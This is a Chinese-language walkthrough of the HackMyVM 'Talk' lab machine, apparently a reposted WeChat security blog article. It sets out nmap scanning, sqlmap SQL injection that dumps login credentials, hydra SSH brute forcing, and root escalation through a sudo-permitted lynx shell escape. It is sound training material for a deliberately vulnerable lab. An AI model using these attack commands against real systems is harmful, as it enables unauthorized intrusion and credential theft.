@@ -1,0 +1,212 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LcYEmZEIXpQaek0mubCpMg)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 59篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghA1tveHTGCaH6E4I2amA4Aj6XALvxavIia4tqprlLqR50XicR6FqbDeQHQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+=========================================================================================================================================================================
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=Talk  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: Talk
+
+难度: 简单
+
+发布时间: 2021年2月18日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo nmap -sP 10.0.0.1/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.109
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.109 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到22和80端口。
+
+Web渗透
+-----
+
+访问80端口
+
+```
+http://10.0.0.109
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后来到登录框。看到登录口先做sql注入，同时扫描目录。
+
+### SQL注入攻击
+
+```
+sqlmap -u 'http://10.0.0.109:80/login.php' --data='username=admin&password=123' --cookie='PHPSESSID=bqv6umm0mof52bohen8dv0a1h2' --batch
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+检测到存在时间注入，继续获取数据库名
+
+```
+sqlmap -u 'http://10.0.0.109:80/login.php' --data='username=admin&password=123' --cookie='PHPSESSID=bqv6umm0mof52bohen8dv0a1h2' --batch --dbs
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到数据库chat，再来查表名
+
+```
+sqlmap -u 'http://10.0.0.109:80/login.php' --data='username=admin&password=123' --cookie='PHPSESSID=bqv6umm0mof52bohen8dv0a1h2' --batch -D chat --tables
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到表名，来查一下user表下的数据
+
+```
+sqlmap -u 'http://10.0.0.109:80/login.php' --data='username=admin&password=123' --cookie='PHPSESSID=bqv6umm0mof52bohen8dv0a1h2' --batch -D chat -T user --dump
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到账号密码，来看看目录扫描的结果
+
+```
+gobuster dir -u http://10.0.0.109 -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+没找到可利用的文件，登录到系统看看
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+## SSH密码暴破
+
+登录后只有一个聊天窗口，没找到可利用的信息。将帐号和密码分开保存尝试暴破SSH
+
+```
+hydra -L user.txt -P pass.txt 10.0.0.109 ssh
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+有3个账号可以登录SSH，找一组先登录进去试试
+
+```
+ssh david@10.0.0.109
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到nona用户目录下有user.txt和flag.sh文件，切换到nona用户
+
+```
+su nona
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，来看看flag.sh是什么
+
+```
+cat flag.sh
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+没什么用，再来找找提权信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+权限提升
+----
+
+找到可以使用root身份执行lynx命令，先看下lynx如何提权，在搜索引擎中找到lynx的使用方法，这是一个命令行下的浏览器
+
+```
+https://ywnz.com/linux/lynx/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+使用!感叹号可以返回shell，验证下
+
+```
+sudo lynx
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+输入！感叹号
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，来找一下flag
+
+```
+cd /root  
+ls  
+cat root.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
